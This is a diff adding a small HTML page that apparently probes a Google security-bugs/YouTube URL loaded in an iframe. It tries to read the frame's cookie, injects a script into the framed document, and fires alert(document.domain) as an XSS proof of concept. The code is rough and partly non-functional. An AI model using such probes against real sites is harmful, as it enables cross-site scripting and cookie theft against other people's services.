@@ -1,0 +1,34 @@
+<html><head><script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
+
+
+
+</head>
+<body style="margin: 0px;font: 14px/18px sans-serif;">
+ 
+<iframe id="myIframe" src="https://www.google.com/appserve/security-bugs/log/youtube" style="width: 100%;height: 100%;border: none;"></iframe>
+<script type="text/javascript">
+/*	ifm = $("#myIframe").contents().find('document').html()	
+	console.log(ifm)
+	var e = document.getElementById("myIframe");
+	var win = document.getElementById('myIframe').contentDocument;
+	win.body;
+	console.log(win.body)*/
+	//document.getElementById('myIframe').style.display = 'none';
+
+	console.log(document.getElementById("myIframe").contentWindow.cookie)
+	           setTimeout( function() {
+	           	var $frame = $("#myIframe");
+            	$('body').html( $frame );
+            	console.log($('body').html( $frame ))
+                var doc = $frame.contentWindow;
+                var $body = $('body',doc);
+                $body.html("<script>alert(document.domain);<\/script>");
+            }, 1 );
+
+
+
+</script>
+<script>alert(document.domain);</script>	
+
+</body></html>
+
